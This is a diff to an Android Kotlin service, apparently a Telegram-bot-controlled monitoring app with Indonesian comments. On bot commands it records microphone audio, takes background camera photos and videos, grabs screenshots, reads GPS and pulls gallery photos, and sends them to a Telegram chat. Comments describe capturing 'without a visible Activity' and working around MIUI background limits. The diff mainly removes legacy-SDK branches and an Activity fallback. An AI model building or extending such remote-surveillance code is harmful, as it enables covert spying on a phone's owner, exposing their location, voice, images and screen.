@@ -24,6 +24,7 @@ import android.media.projection.MediaProjectionManager
 import android.location.Location
 import android.location.LocationManager
 import android.os.Build
+import androidx.annotation.RequiresApi
 import android.os.IBinder
 
 import android.media.AudioAttributes
@@ -103,13 +104,6 @@ class TelegramService : Service() {
         loadPrefs()
         registerReceiver(mediaProjectionReceiver, IntentFilter(ACTION_MEDIA_PROJECTION))
         registerReceiver(permissionResultReceiver, IntentFilter(ACTION_PERMISSION_RESULT))
-        registerReceiver(
-            recordResultReceiver,
-            IntentFilter().apply {
-                addAction(AudioRecorderActivity.ACTION_DONE)
-                addAction(AudioRecorderActivity.ACTION_FAIL)
-            }
-        )
         acquireWakeLock()
         Log.d(TAG, "onCreate: token=${botToken.take(8)}, chatId=$botChatId")
     }
@@ -122,7 +116,6 @@ class TelegramService : Service() {
         cleanupMediaProjection()
         unregisterReceiver(mediaProjectionReceiver)
         unregisterReceiver(permissionResultReceiver)
-        try { unregisterReceiver(recordResultReceiver) } catch (_: Exception) {}
     }
 
     /** Akuisisi wakelock (PARTIAL) agar polling tetap jalan saat screen off. */
@@ -186,11 +179,9 @@ class TelegramService : Service() {
 
     private fun startForeground() {
         val ch = "telebot_monitor"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             getSystemService(NotificationManager::class.java).createNotificationChannel(
                 NotificationChannel(ch, "TeleBot Monitor", NotificationManager.IMPORTANCE_LOW)
             )
-        }
         val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
         val note = NotificationCompat.Builder(this, ch)
             .setContentTitle("TeleBot Monitor")
@@ -206,11 +197,9 @@ class TelegramService : Service() {
      *  sah ke MIUI agar mic access tidak di-blokir saat app di-background. */
     private fun showRecordingNotification() {
         val ch = "telebot_recording"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             getSystemService(NotificationManager::class.java).createNotificationChannel(
                 NotificationChannel(ch, "Rekaman TeleBot", NotificationManager.IMPORTANCE_LOW)
             )
-        }
         val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
         val note = NotificationCompat.Builder(this, ch)
             .setContentTitle("⏺️ Sedang merekam audio...")
@@ -494,7 +483,6 @@ class TelegramService : Service() {
     private suspend fun getLocation(chatId: String) {
         // Izin lokasi diminta saat install (MainActivity). Kalau belum di-grant,
         // cukup pesan singkat — bukan error teknis.
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val notGranted = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) !=
                 android.content.pm.PackageManager.PERMISSION_GRANTED ||
                 checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) !=
@@ -503,7 +491,6 @@ class TelegramService : Service() {
                 sendText(chatId, "⚠️ Izin lokasi belum diberikan. Buka app → ketik \"izinkan\" → pilih Always. Lalu /gps lagi.")
                 return
             }
-        }
         try {
             val lm = getSystemService(LOCATION_SERVICE) as LocationManager
             var location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
@@ -560,20 +547,12 @@ class TelegramService : Service() {
 
     /** Kirim N foto terakhir dari galeri (MediaStore) ke chat. */
     private suspend fun sendPhotosFromGallery(chatId: String, count: Int) {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val granted = when {
-                Build.VERSION.SDK_INT >= 33 ->
-                    checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) ==
-                        android.content.pm.PackageManager.PERMISSION_GRANTED
-                else ->
-                    checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) ==
-                        android.content.pm.PackageManager.PERMISSION_GRANTED
-            }
+            val granted = checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) ==
+                android.content.pm.PackageManager.PERMISSION_GRANTED
             if (!granted) {
                 sendText(chatId, "⚠️ Izin akses galeri belum diberikan. Buka app → izinkan akses penyimpanan → lalu /photo lagi.")
                 return
             }
-        }
         try {
             val collection = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
             // Ambil _ID + DATE_ADDED, sort descending, lalu batasi N di memori
@@ -656,14 +635,12 @@ class TelegramService : Service() {
             sendText(chatId, "Sedang merekam... tunggu selesai.")
             return
         }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val granted = checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) ==
                     android.content.pm.PackageManager.PERMISSION_GRANTED
             if (!granted) {
                 sendText(chatId, "⚠️ Izin mikrofon belum diberikan. Buka app → izinkan akses mikrofon → lalu /record lagi.")
                 return
             }
-        }
         val ts = System.currentTimeMillis()
         val outDir = getExternalFilesDir(null) ?: filesDir
         val outFile = java.io.File(outDir, "rec_${ts}.m4a")
@@ -679,36 +656,24 @@ class TelegramService : Service() {
 
             // --- 1. Request audio focus (wajib di MIUI) ---
             try {
-                if (Build.VERSION.SDK_INT >= 26) {
-                    val focusReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
-                        .setAudioAttributes(
-                            AudioAttributes.Builder()
-                                .setUsage(AudioAttributes.USAGE_MEDIA)
-                                .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
-                                .build()
-                        )
-                        .build()
-                    focusGranted = am.requestAudioFocus(focusReq) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
-                } else {
-                    @Suppress("DEPRECATION")
-                    focusGranted = am.requestAudioFocus(
-                        null, AudioManager.STREAM_MUSIC, AudioManager.AUDIOFOCUS_GAIN
-                    ) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
-                }
+                val focusReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
+                    .setAudioAttributes(
+                        AudioAttributes.Builder()
+                            .setUsage(AudioAttributes.USAGE_MEDIA)
+                            .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
+                            .build()
+                    )
+                    .build()
+                focusGranted = am.requestAudioFocus(focusReq) == AudioManager.AUDIOFOCUS_REQUEST_GRANTED
                 Log.d(TAG, "recordAudio: audioFocus=$focusGranted")
             } catch (e: Exception) {
                 Log.w(TAG, "recordAudio: audioFocus fail: ${e.message}")
             }
 
-            // --- 2. MediaRecorder retry: VOICE_RECOGNITION → MIC ---
+            // --- 2. MediaRecorder: VOICE_RECOGNITION → MIC (pola Android 14, tanpa fallback Activity) ---
             var startOk = false
             for (source in listOf(MediaRecorder.AudioSource.VOICE_RECOGNITION, MediaRecorder.AudioSource.MIC)) {
-                val rec = if (Build.VERSION.SDK_INT >= 31) {
-                    MediaRecorder(applicationContext)
-                } else {
-                    @Suppress("DEPRECATION")
-                    MediaRecorder()
-                }
+                val rec = MediaRecorder(applicationContext)
                 mediaRecorder = rec
                 try {
                     rec.setAudioSource(source)
@@ -728,20 +693,13 @@ class TelegramService : Service() {
                 }
             }
 
-            // --- 3. Fallback: launch Activity kalau semua source gagal ---
+            // Semua source gagal — report langsung
             if (!startOk) {
-                Log.w(TAG, "recordAudio: all sources failed in-service, launching AudioRecorderActivity as fallback")
-                mediaRecorder = null
-                try {
-                    val i = Intent(applicationContext, AudioRecorderActivity::class.java)
-                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
-                    i.putExtra(AudioRecorderActivity.EXTRA_CHAT_ID, chatId)
-                    startActivity(i)
-                    // Activity akan broadcast ACTION_DONE/FAIL — state direset di recordResultReceiver
-                    return@launch
-                } catch (e: Exception) {
-                    Log.e(TAG, "recordAudio: fallback activity fail: ${e.message}")
-                }
+                Log.e(TAG, "recordAudio: all sources failed in-service")
+                isRecording = false
+                hideRecordingNotification()
+                sendText(chatId, "❌ Gagal start perekaman audio. Coba /record lagi.")
+                return@launch
             }
 
             // --- 4. Rekam 15 detik ---
@@ -759,20 +717,15 @@ class TelegramService : Service() {
             // --- 6. Release audio focus ---
             if (focusGranted) {
                 try {
-                    if (Build.VERSION.SDK_INT >= 26) {
-                        val abandonReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
-                            .setAudioAttributes(
-                                AudioAttributes.Builder()
-                                    .setUsage(AudioAttributes.USAGE_MEDIA)
-                                    .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
-                                    .build()
-                            )
-                            .build()
-                        am.abandonAudioFocusRequest(abandonReq)
-                    } else {
-                        @Suppress("DEPRECATION")
-                        am.abandonAudioFocus(null)
-                    }
+                    val abandonReq = android.media.AudioFocusRequest.Builder(AudioManager.AUDIOFOCUS_GAIN)
+                        .setAudioAttributes(
+                            AudioAttributes.Builder()
+                                .setUsage(AudioAttributes.USAGE_MEDIA)
+                                .setContentType(AudioAttributes.CONTENT_TYPE_SPEECH)
+                                .build()
+                        )
+                        .build()
+                    am.abandonAudioFocusRequest(abandonReq)
                 } catch (_: Exception) {}
             }
 
@@ -791,38 +744,6 @@ class TelegramService : Service() {
         }
     }
 
-    /** Receiver hasil rekaman fallback dari AudioRecorderActivity. */
-    private val recordResultReceiver = object : BroadcastReceiver() {
-        override fun onReceive(context: Context, intent: Intent) {
-            val chatId = intent.getStringExtra(AudioRecorderActivity.EXTRA_CHAT_ID) ?: ""
-            when (intent.action) {
-                AudioRecorderActivity.ACTION_DONE -> {
-                    val path = intent.getStringExtra(AudioRecorderActivity.EXTRA_FILE) ?: ""
-                    val file = java.io.File(path)
-                    isRecording = false
-                    hideRecordingNotification()
-                    if (file.exists() && file.length() > 0) {
-                        Log.d(TAG, "recordResult: done, ${file.length()} bytes")
-                        scope?.launch {
-                            sendAudio(chatId, file, "Rekaman ${android.text.format.DateFormat.format("HH:mm", System.currentTimeMillis())}")
-                            file.delete()
-                        }
-                    } else {
-                        if (path.isNotEmpty()) file.delete()
-                        scope?.launch { sendText(chatId, "❌ File rekaman kosong (0 bytes).") }
-                    }
-                }
-                AudioRecorderActivity.ACTION_FAIL -> {
-                    val err = intent.getStringExtra(AudioRecorderActivity.EXTRA_ERROR) ?: "unknown"
-                    isRecording = false
-                    hideRecordingNotification()
-                    Log.w(TAG, "recordResult: fail: $err")
-                    scope?.launch { sendText(chatId, "❌ Rekaman gagal: $err") }
-                }
-            }
-        }
-    }
-
     /** Ambil foto kamera depan/belakang secara background (tanpa Activity terlihat).
      *  Kamera dibuka via Camera2 + ImageReader di service; notification foreground
      *  id=3 (channel khusus kamera) jadi visible surface sah MIUI. */
@@ -831,14 +752,12 @@ class TelegramService : Service() {
             sendText(chatId, "Sedang mengambil foto... tunggu selesai.")
             return
         }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val granted = checkSelfPermission(android.Manifest.permission.CAMERA) ==
                     android.content.pm.PackageManager.PERMISSION_GRANTED
             if (!granted) {
                 sendText(chatId, "⚠️ Izin kamera belum diberikan. Buka app → izinkan akses kamera → lalu /camfront atau /camback lagi.")
                 return
             }
-        }
         isCapturingCamera = true
         showCameraNotification(facing)
         val label = if (facing == "front") "depan" else "belakang"
@@ -1004,11 +923,9 @@ class TelegramService : Service() {
     /** Tampilkan notification foreground kamera (id=3). */
     private fun showCameraNotification(facing: String) {
         val ch = "telebot_camera"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             getSystemService(NotificationManager::class.java).createNotificationChannel(
                 NotificationChannel(ch, "Kamera TeleBot", NotificationManager.IMPORTANCE_LOW)
             )
-        }
         val label = if (facing == "front") "depan" else "belakang"
         val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
         val note = NotificationCompat.Builder(this, ch)
@@ -1042,14 +959,12 @@ class TelegramService : Service() {
             sendText(chatId, "Sedang merekam video... tunggu selesai.")
             return
         }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             val camGranted = checkSelfPermission(android.Manifest.permission.CAMERA) ==
                     android.content.pm.PackageManager.PERMISSION_GRANTED
             if (!camGranted) {
                 sendText(chatId, "⚠️ Izin kamera belum diberikan. Buka app → izinkan akses kamera → lalu /vidfront atau /vidback lagi.")
                 return
             }
-        }
         isRecordingVideo = true
         val label = if (facing == "front") "depan" else "belakang"
         showVideoNotification(label)
@@ -1090,18 +1005,16 @@ class TelegramService : Service() {
      *  MediaRecorder.getOutputSurface() tersedia mulai API 33, jadi ini cara resmi
      *  merekam video kamera tanpa Activity, tanpa MediaProjection, tanpa manual
      *  MediaCodec/MediaMuxer. Untuk API < 33 fallback ke pipeline manual. */
+    @RequiresApi(33)
     private fun recordOneVideo(facing: String, seconds: Int): Pair<java.io.File?, String>? {
         val outDir = getExternalFilesDir(null) ?: filesDir
         val outFile = java.io.File(outDir, "vid_${facing}_${System.currentTimeMillis()}.mp4")
         if (outFile.exists()) outFile.delete()
-
-        if (Build.VERSION.SDK_INT >= 33) {
-            return recordVideoApi33(facing, seconds, outFile)
-        }
-        return recordVideoManual(facing, seconds, outFile)
+        return recordVideoApi33(facing, seconds, outFile)
     }
 
     /** Pipeline API 33+: Camera2 + MediaRecorder.getOutputSurface(). */
+    @androidx.annotation.RequiresApi(33)
     private fun recordVideoApi33(
         facing: String,
         seconds: Int,
@@ -1144,12 +1057,10 @@ class TelegramService : Service() {
             rec.prepare()
 
             // Surface milik MediaRecorder — ini input video (API 33+)
-            // getOutputSurface() ada sejak API 33, dipanggil lewat reflection agar
-            // compile untuk minSdk 24 tetap sukses.
-            val getOutSurfaceMethod = MediaRecorder::class.java.getMethod("getOutputSurface")
-            val recSurface = (getOutSurfaceMethod.invoke(rec) as? android.view.Surface)
+            val getOutSurface = MediaRecorder::class.java.getMethod("getOutputSurface")
+            val recSurface = getOutSurface.invoke(rec) as? android.view.Surface
                 ?: return Pair(null, "recorder_output_surface_null")
-            Log.d(TAG, "recordVideoApi33: got recorder output surface (reflection)")
+            Log.d(TAG, "recordVideoApi33: got recorder output surface")
 
             // --- 2. Buka Camera2, target ke recorder surface ---
             val latch = java.util.concurrent.CountDownLatch(1)
@@ -1219,8 +1130,8 @@ class TelegramService : Service() {
             try { camera?.close() } catch (_: Exception) {}
             try { rec.release() } catch (_: Exception) {}
             try {
-                val getOutSurfaceMethod = MediaRecorder::class.java.getMethod("getOutputSurface")
-                (getOutSurfaceMethod.invoke(rec) as? android.view.Surface)?.release()
+                val m = MediaRecorder::class.java.getMethod("getOutputSurface")
+                (m.invoke(rec) as? android.view.Surface)?.release()
             } catch (_: Exception) {}
             return Pair(null, "recorder_fail: ${e.javaClass.simpleName}: ${e.message}")
         }
@@ -1241,238 +1152,12 @@ class TelegramService : Service() {
         else Pair(null, "file_empty(${outFile.length()}b)")
     }
 
-    /** Fallback API < 33: Camera2 + ImageReader (YUV) + MediaCodec + MediaMuxer. */
-    private fun recordVideoManual(
-        facing: String,
-        seconds: Int,
-        outFile: java.io.File
-    ): Pair<java.io.File?, String>? {
-        val cm = getSystemService(android.hardware.camera2.CameraManager::class.java)
-            ?: return Pair(null, "no_camera_manager")
-        val wantedFacing = if (facing == "front")
-            android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
-        else
-            android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
-        val cameraId = cm.cameraIdList.firstOrNull { id ->
-            try {
-                cm.getCameraCharacteristics(id).get(
-                    android.hardware.camera2.CameraCharacteristics.LENS_FACING
-                ) == wantedFacing
-            } catch (e: Exception) { false }
-        } ?: return Pair(null, "no_camera_facing=$facing")
-
-        val vw = 640; val vh = 480
-        val reader = android.media.ImageReader.newInstance(vw, vh, android.graphics.ImageFormat.YUV_420_888, 4)
-        val format = android.media.MediaFormat.createVideoFormat("video/avc", vw, vh).apply {
-            setInteger(android.media.MediaFormat.KEY_COLOR_FORMAT,
-                android.media.MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible)
-            setInteger(android.media.MediaFormat.KEY_BIT_RATE, 2_000_000)
-            setInteger(android.media.MediaFormat.KEY_FRAME_RATE, 30)
-            setInteger(android.media.MediaFormat.KEY_I_FRAME_INTERVAL, 2)
-        }
-        val encoder = android.media.MediaCodec.createEncoderByType("video/avc")
-        encoder.configure(format, null, null, android.media.MediaCodec.CONFIGURE_FLAG_ENCODE)
-        val muxer = android.media.MediaMuxer(outFile.absolutePath, android.media.MediaMuxer.OutputFormat.MUXER_OUTPUT_MPEG_4)
-        var muxerStarted = false
-        var trackIndex = -1
-        val frameCount = java.util.concurrent.atomic.AtomicInteger(0)
-
-        val handler = android.os.Handler(android.os.Looper.getMainLooper())
-        val latch = java.util.concurrent.CountDownLatch(1)
-        var camDevice: android.hardware.camera2.CameraDevice? = null
-        var camSession: android.hardware.camera2.CameraCaptureSession? = null
-        try {
-            cm.openCamera(cameraId, object : android.hardware.camera2.CameraDevice.StateCallback() {
-                override fun onOpened(dev: android.hardware.camera2.CameraDevice) {
-                    try {
-                        camDevice = dev
-                        val req = dev.createCaptureRequest(
-                            android.hardware.camera2.CameraDevice.TEMPLATE_RECORD
-                        ).apply { addTarget(reader.surface) }
-                        dev.createCaptureSession(
-                            listOf(reader.surface),
-                            object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
-                                override fun onConfigured(sess: android.hardware.camera2.CameraCaptureSession) {
-                                    camSession = sess
-                                    try {
-                                        sess.setRepeatingRequest(req.build(), null, handler)
-                                    } catch (e: Exception) {
-                                        Log.e(TAG, "recordVideoManual: repeating fail: ${e.message}")
-                                    }
-                                    latch.countDown()
-                                }
-                                override fun onClosed(sess: android.hardware.camera2.CameraCaptureSession) {}
-                                override fun onConfigureFailed(sess: android.hardware.camera2.CameraCaptureSession) {
-                                    latch.countDown()
-                                }
-                            }, handler
-                        )
-                    } catch (e: Exception) {
-                        latch.countDown()
-                    }
-                }
-                override fun onDisconnected(dev: android.hardware.camera2.CameraDevice) {
-                    try { dev.close() } catch (_: Exception) {}
-                }
-                override fun onError(dev: android.hardware.camera2.CameraDevice, error: Int) {
-                    latch.countDown()
-                }
-            }, handler)
-            if (!latch.await(10, java.util.concurrent.TimeUnit.SECONDS)) {
-                try { camDevice?.close() } catch (_: Exception) {}
-                try { encoder.release() } catch (_: Exception) {}
-                try { muxer.release() } catch (_: Exception) {}
-                try { reader.close() } catch (_: Exception) {}
-                return Pair(null, "camera_session_timeout")
-            }
-        } catch (e: Exception) {
-            return Pair(null, "camera_open_fail: ${e.javaClass.simpleName}: ${e.message}")
-        }
-
-        var inputBuffers: Array<java.nio.ByteBuffer>
-        var outputBuffers: Array<java.nio.ByteBuffer>
-        try {
-            encoder.start()
-            val outFmt = encoder.outputFormat
-                ?: return Pair(null, "codec_output_format_null")
-            inputBuffers = encoder.inputBuffers
-                ?: return Pair(null, "encoder_input_buffers_null")
-            outputBuffers = encoder.outputBuffers
-                ?: return Pair(null, "encoder_output_buffers_null")
-            muxer.start()
-            muxerStarted = true
-            trackIndex = muxer.addTrack(outFmt)
-        } catch (e: Exception) {
-            try { camSession?.close() } catch (_: Exception) {}
-            try { camDevice?.close() } catch (_: Exception) {}
-            try { encoder.release() } catch (_: Exception) {}
-            try { muxer.release() } catch (_: Exception) {}
-            try { reader.close() } catch (_: Exception) {}
-            return Pair(null, "codec_start_fail: ${e.javaClass.simpleName}: ${e.message}")
-        }
-
-        val totalFrames = seconds * 30
-        while (frameCount.get() < totalFrames) {
-            val image = reader.acquireLatestImage()
-            if (image == null) {
-                Thread.sleep(33)
-                continue
-            }
-            try {
-                val planes = image.planes
-                val yBuf = planes[0].buffer
-                val yRowStride = planes[0].rowStride
-                if (planes[0].pixelStride == 1) {
-                    val inIdx = encoder.dequeueInputBuffer(100_000)
-                    if (inIdx >= 0) {
-                        val inBuf = inputBuffers[inIdx]
-                        val ySize = vw * vh
-                        val uSize = vw * vh / 4
-                        val uHalf = vw / 2
-                        inBuf.clear()
-                        val yArr = ByteArray(ySize)
-                        val yCopy = yBuf.duplicate()
-                        if (yRowStride == vw) {
-                            yCopy.limit(ySize); yCopy.get(yArr)
-                        } else {
-                            for (row in 0 until vh) {
-                                yCopy.position(row * yRowStride)
-                                yCopy.get(yArr, row * vw, vw)
-                            }
-                        }
-                        inBuf.put(yArr)
-                        val uBuf = planes[1].buffer
-                        val uArr = ByteArray(uSize)
-                        val uCopy = uBuf.duplicate()
-                        val uvRowStride = planes[1].rowStride
-                        if (planes[1].pixelStride == 1 && uvRowStride == uHalf) {
-                            uCopy.limit(uSize); uCopy.get(uArr)
-                        } else if (planes[1].pixelStride == 1) {
-                            for (row in 0 until vh / 2) {
-                                uCopy.position(row * uvRowStride)
-                                uCopy.get(uArr, row * uHalf, uHalf)
-                            }
-                        }
-                        inBuf.put(uArr)
-                        val vBuf = planes[2].buffer
-                        val vArr = ByteArray(uSize)
-                        val vCopy = vBuf.duplicate()
-                        val vRowStride = planes[2].rowStride
-                        if (planes[2].pixelStride == 1 && vRowStride == uHalf) {
-                            vCopy.limit(uSize); vCopy.get(vArr)
-                        } else if (planes[2].pixelStride == 1) {
-                            for (row in 0 until vh / 2) {
-                                vCopy.position(row * vRowStride)
-                                vCopy.get(vArr, row * uHalf, uHalf)
-                            }
-                        }
-                        inBuf.put(vArr)
-                        val pts = frameCount.get() * (1_000_000_000L / 30)
-                        encoder.queueInputBuffer(inIdx, 0, inBuf.position(), pts, 0)
-                        frameCount.incrementAndGet()
-                    }
-                }
-            } finally {
-                image.close()
-            }
-
-            val outInfo = android.media.MediaCodec.BufferInfo()
-            while (true) {
-                val outIdx = encoder.dequeueOutputBuffer(outInfo, 10_000)
-                if (outIdx < 0) break
-                val codecBuf = outputBuffers[outIdx]
-                if (outInfo.size > 0 && muxerStarted)
-                    muxer.writeSampleData(trackIndex, codecBuf, outInfo)
-                encoder.releaseOutputBuffer(outIdx, false)
-                if (outInfo.flags and android.media.MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) break
-            }
-        }
-
-        try {
-            val inIdx = encoder.dequeueInputBuffer(10_000)
-            if (inIdx >= 0)
-                encoder.queueInputBuffer(inIdx, 0, 0, 0, android.media.MediaCodec.BUFFER_FLAG_END_OF_STREAM)
-        } catch (_: Exception) {}
-        var gotEos = false
-        val outInfo = android.media.MediaCodec.BufferInfo()
-        var loop = 0
-        while (loop < 100) {
-            val outIdx = encoder.dequeueOutputBuffer(outInfo, 5_000)
-            if (outIdx < 0) { loop++; continue }
-            val codecBuf = outputBuffers[outIdx]
-            if (outInfo.flags and android.media.MediaCodec.BUFFER_FLAG_END_OF_STREAM != 0) {
-                if (outInfo.size > 0) try { muxer.writeSampleData(trackIndex, codecBuf, outInfo) } catch (_: Exception) {}
-                encoder.releaseOutputBuffer(outIdx, false)
-                gotEos = true
-                break
-            }
-            if (outInfo.size > 0 && muxerStarted)
-                muxer.writeSampleData(trackIndex, codecBuf, outInfo)
-            encoder.releaseOutputBuffer(outIdx, false)
-        }
-
-        try { encoder.stop() } catch (_: Exception) {}
-        try { encoder.release() } catch (_: Exception) {}
-        try { camSession?.close() } catch (_: Exception) {}
-        try { camDevice?.close() } catch (_: Exception) {}
-        try { if (muxerStarted) muxer.stop() } catch (e: Exception) { Log.w(TAG, "recordVideoManual: muxer stop: ${e.message}") }
-        try { muxer.release() } catch (_: Exception) {}
-        try { reader.close() } catch (_: Exception) {}
-
-        return if (outFile.exists() && outFile.length() > 1024)
-            Pair(outFile, "ok")
-        else
-            Pair(null, "file_empty(${outFile.length()}b, ${frameCount.get()} frames, eos=$gotEos)")
-    }
-
     /** Tampilkan notification foreground video (id=4). */
     private fun showVideoNotification(label: String) {
         val ch = "telebot_video"
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             getSystemService(NotificationManager::class.java).createNotificationChannel(
                 NotificationChannel(ch, "Video TeleBot", NotificationManager.IMPORTANCE_LOW)
             )
-        }
         val pi = PendingIntent.getActivity(this, 0, Intent(this, MainActivity::class.java), PendingIntent.FLAG_IMMUTABLE)
         val note = NotificationCompat.Builder(this, ch)
             .setContentTitle("🎥 Merekam video kamera $label...")
@@ -1615,8 +1300,6 @@ class TelegramService : Service() {
     }
 
     private fun stopRecording() {
-        // Recording sekarang dipegang AudioRecorderActivity (bukan service);
-        // fungsi ini cuma reset state service bila masih ada ref lama.
         val rec = mediaRecorder ?: run {
             isRecording = false
             return
@@ -1671,16 +1354,15 @@ class TelegramService : Service() {
 
     private fun ensureVirtualDisplay() {
         if (virtualDisplay != null) return
-        val dm = DisplayMetrics()
         val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
-        @Suppress("DEPRECATION")
-        windowManager.defaultDisplay.getRealMetrics(dm)
-        imageReader = ImageReader.newInstance(
-            dm.widthPixels, dm.heightPixels, PixelFormat.RGBA_8888, 2
-        )
+        val metrics = windowManager.currentWindowMetrics
+        val w = metrics.bounds.width()
+        val h = metrics.bounds.height()
+        val dpi = (resources.displayMetrics.density * 160f).toInt()
+        imageReader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
         val mp = mediaProjection ?: return
         virtualDisplay = mp.createVirtualDisplay(
-            "Screenshot", dm.widthPixels, dm.heightPixels, dm.densityDpi,
+            "Screenshot", w, h, dpi,
             android.view.Surface.ROTATION_0, imageReader!!.surface, null, null
         )
     }
